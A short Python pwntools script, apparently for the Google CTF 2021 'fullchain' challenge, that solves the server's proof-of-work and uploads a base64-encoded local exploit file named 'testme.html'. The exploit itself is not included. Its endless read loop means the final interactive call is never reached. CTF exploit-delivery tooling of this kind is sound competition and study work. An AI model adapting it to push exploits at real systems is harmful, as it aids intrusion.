from pwn import *
import subprocess
import base64

f = open('testme.html', 'rb').read()
enc_f = base64.b64encode(f)
exp_len = len(enc_f)

HOST = 'fullchain.2021.ctfcompetition.com'
PORT = 1337
s = remote(HOST, PORT)
data = s.recvuntil(b'Solution? ')
data = data.split(b'\n')[3].split(b' ')[-1]
print(data)

out = subprocess.check_output(['python3', 'ggctfpow.py', 'solve', data])

#out = out.strip().split(b'\n')[1]
print(out)
s.sendline(out)
s.recvuntil(b'How many bytes is your base64-encoded exploit? ')
s.sendline(bytes(str(exp_len).encode('ascii')))

s.recvuntil(b'base64!')
s.sendline(enc_f)
while True:
    data = s.recvline()
    if data.startswith(b'\x1bc'):
        pass

    print(data)
s.interactive()
s.close()
